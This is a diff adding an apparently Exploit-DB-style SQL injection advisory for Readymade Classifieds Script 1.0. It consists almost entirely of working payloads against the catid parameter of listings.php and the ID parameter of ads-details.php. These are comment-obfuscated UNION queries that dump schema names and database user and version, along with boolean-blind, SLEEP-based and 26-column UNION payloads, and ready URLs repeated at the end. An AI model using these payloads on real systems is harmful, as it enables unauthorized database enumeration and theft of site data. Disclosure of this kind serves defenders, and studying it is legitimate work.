@@ -1,0 +1,62 @@
+# # # # # 
+# Exploit Title: Readymade Classifieds Script 1.0 - SQL Injection
+# Dork: N/A
+# Date: 02.12.2017
+# Vendor Homepage: http://www.scubez.net/
+# Software Link: http://www.posty.in/index.html
+# Demo: http://www.posty.in/readymade-classifieds-demo.html
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# 
+# http://localhost/[PATH]/listings.php?catid=[SQL]
+# 
+# -1++/*!08888UNION*/((/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)))--+-
+# 
+# Parameter: catid (GET)
+#     Type: boolean-based blind
+#     Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
+#     Payload: catid=-7326' OR 9205=9205#
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: catid=' AND SLEEP(5)-- tCbs
+# 	
+# 2)
+# 
+# http://localhost/[PATH]/ads-details.php?ID=[SQL]
+# 
+# -265++/*!08888UNION*/(/*!08888SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26))--+-
+# 
+# Parameter: ID (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: ID=265 AND 4157=4157
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: ID=265 AND SLEEP(5)
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 26 columns
+#     Payload: ID=-5939 UNION ALL SELECT NULL,NULL,CONCAT(0x716a626271,0x664f68565771437a5444554e794f547462774e65574f43616b767945464c416d524b646f48675a67,0x71787a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZIaY
+# 
+# Etc..
+# # # # #
+
+ 
+
+
+http://server/listings.php?catid=-1++/*!08888UNION*/((/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)))--+-
+
+http://server/ads-details.php?ID=-265++/*!08888UNION*/(/*!08888SELECT*/(1),CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),(4),(5),(6),(7),(8),(9),(10),(11),(12),(13),(14),(15),(16),(17),(18),(19),(20),(21),(22),(23),(24),(25),(26))--+-
